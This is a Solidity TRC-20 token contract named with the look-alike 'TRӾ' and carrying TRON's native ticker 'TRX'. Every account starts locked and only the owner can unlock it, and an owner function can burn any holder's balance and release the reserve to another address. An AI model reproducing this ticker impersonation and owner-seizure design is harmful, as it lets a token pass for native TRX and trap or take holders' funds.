// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOneTraxReserveVault {
    function reserveBalance() external view returns (uint256);
    function authorizedToken() external view returns (address);
    function releaseForRedemption(address payable recipient, uint256 amount, bytes32 redemptionReference) external returns (bool);
}

/// @title Tron Transfer TRӾ
/// @notice A distinct TRC-20 token named TRӾ with symbol TRX. It is not native TRX.
/// @dev All recipients start locked. Only the owner can unlock an account. Minting must be fully backed by native TRX in the separate vault.
contract Restricted1TRAX {
    string public constant name = unicode"TRӾ";
    string public constant symbol = "TRX";
    uint8 public constant decimals = 6;

    address public owner;
    address public pendingOwner;
    address public reserveVault;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    struct AllowanceData { uint256 amount; uint256 ownerLockNonce; uint256 spenderLockNonce; }
    mapping(address => mapping(address => AllowanceData)) private _allowances;
    mapping(address => uint256) private _lockNonce;
    mapping(address => bool) private _unlocked;

    bool public mintingEnabled;
    bool public paused;
    bool private _redemptionEntered;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 value);
    event RecipientLockChanged(address indexed account, bool locked);
    event OwnerTransferStarted(address indexed currentOwner, address indexed pendingOwner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnerRedemption(address indexed holder, address indexed recipient, uint256 amount, bytes32 indexed redemptionReference);
    event MintingStatusChanged(bool enabled);
    event PauseStatusChanged(bool paused);
    event ReserveVaultConfigured(address indexed vault);

    modifier onlyOwner() { require(msg.sender == owner, "owner-only"); _; }
    modifier nonReentrant() {
        require(!_redemptionEntered, "reentrant-call");
        _redemptionEntered = true;
        _;
        _redemptionEntered = false;
    }

    constructor() {
        owner = msg.sender;
        mintingEnabled = false;
        paused = true;
        emit OwnershipTransferred(address(0), msg.sender);
        emit MintingStatusChanged(false);
        emit PauseStatusChanged(true);
    }

    function totalSupply() external view returns (uint256) { return _totalSupply; }
    function balanceOf(address account) external view returns (uint256) { return _balances[account]; }
    function allowance(address tokenOwner, address spender) external view returns (uint256) {
        AllowanceData storage data = _allowances[tokenOwner][spender];
        if (!_unlocked[tokenOwner] || !_unlocked[spender] || data.ownerLockNonce != _lockNonce[tokenOwner] || data.spenderLockNonce != _lockNonce[spender]) return 0;
        return data.amount;
    }
    function isLocked(address account) public view returns (bool) { return !_unlocked[account]; }

    function transferOwnership(address nextOwner) external onlyOwner {
        require(nextOwner != address(0) && nextOwner != owner, "invalid-pending-owner");
        pendingOwner = nextOwner;
        emit OwnerTransferStarted(owner, nextOwner);
    }

    function acceptOwnership() external {
        require(msg.sender == pendingOwner && pendingOwner != address(0), "not-pending-owner");
        address previous = owner;
        owner = pendingOwner;
        pendingOwner = address(0);
        emit OwnershipTransferred(previous, owner);
    }

    function setRecipientLocked(address account, bool locked) external onlyOwner {
        require(account != address(0), "zero-account");
        bool wasLocked = !_unlocked[account];
        if (wasLocked != locked) _lockNonce[account] += 1;
        _unlocked[account] = !locked;
        emit RecipientLockChanged(account, locked);
    }

    function setReserveVault(address vault) external onlyOwner {
        require(reserveVault == address(0), "reserve-vault-already-set");
        require(vault != address(0) && vault.code.length > 0, "invalid-reserve-vault");
        require(IOneTraxReserveVault(vault).authorizedToken() == address(this), "reserve-vault-token-not-authorized");
        reserveVault = vault;
        emit ReserveVaultConfigured(vault);
    }

    function setPaused(bool value) external onlyOwner {
        paused = value;
        emit PauseStatusChanged(value);
    }

    function setMintingEnabled(bool value) external onlyOwner {
        require(!value || (!paused && reserveVault != address(0)), "unpause-and-configure-vault-first");
        mintingEnabled = value;
        emit MintingStatusChanged(value);
    }

    function mint(address recipient, uint256 amount) external onlyOwner {
        require(!paused, "paused");
        require(mintingEnabled, "minting-disabled");
        require(reserveVault != address(0), "reserve-vault-not-configured");
        require(recipient != address(0), "zero-recipient");
        require(amount > 0, "zero-amount");
        require(_totalSupply <= type(uint256).max - amount, "supply-overflow");
        require(_balances[recipient] <= type(uint256).max - amount, "balance-overflow");
        require(IOneTraxReserveVault(reserveVault).reserveBalance() >= _totalSupply + amount, "insufficient-trx-reserve");
        _totalSupply += amount;
        _balances[recipient] += amount;
        emit Transfer(address(0), recipient, amount);
    }

    function redeemForOwner(address holder, address payable recipient, uint256 amount, bytes32 redemptionReference)
        external onlyOwner nonReentrant
    {
        require(!paused, "paused");
        require(reserveVault != address(0), "reserve-vault-not-configured");
        require(holder != address(0) && recipient != address(0), "zero-address");
        require(amount > 0, "zero-amount");
        require(redemptionReference != bytes32(0), "reference-required");
        require(_balances[holder] >= amount, "insufficient-holder-balance");

        _balances[holder] -= amount;
        _totalSupply -= amount;
        bool released = IOneTraxReserveVault(reserveVault).releaseForRedemption(recipient, amount, redemptionReference);
        require(released, "reserve-release-failed");

        emit Transfer(holder, address(0), amount);
        emit OwnerRedemption(holder, recipient, amount, redemptionReference);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!paused, "paused");
        require(_unlocked[msg.sender], "sender-locked");
        require(to != address(0) && _unlocked[to], "recipient-locked");
        require(amount > 0 && _balances[msg.sender] >= amount, "invalid-transfer-amount");
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        require(!paused, "paused");
        require(_unlocked[msg.sender], "owner-locked");
        require(spender != address(0) && _unlocked[spender], "spender-locked");
        _allowances[msg.sender][spender] = AllowanceData(amount, _lockNonce[msg.sender], _lockNonce[spender]);
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(!paused, "paused");
        require(from != address(0) && to != address(0), "zero-address");
        require(_unlocked[msg.sender] && _unlocked[from] && _unlocked[to], "account-locked");
        require(amount > 0 && _balances[from] >= amount, "invalid-transfer-amount");
        uint256 permitted = allowance(from, msg.sender);
        require(permitted >= amount, "insufficient-allowance");
        _allowances[from][msg.sender].amount = permitted - amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        emit Approval(from, msg.sender, permitted - amount);
        return true;
    }
}
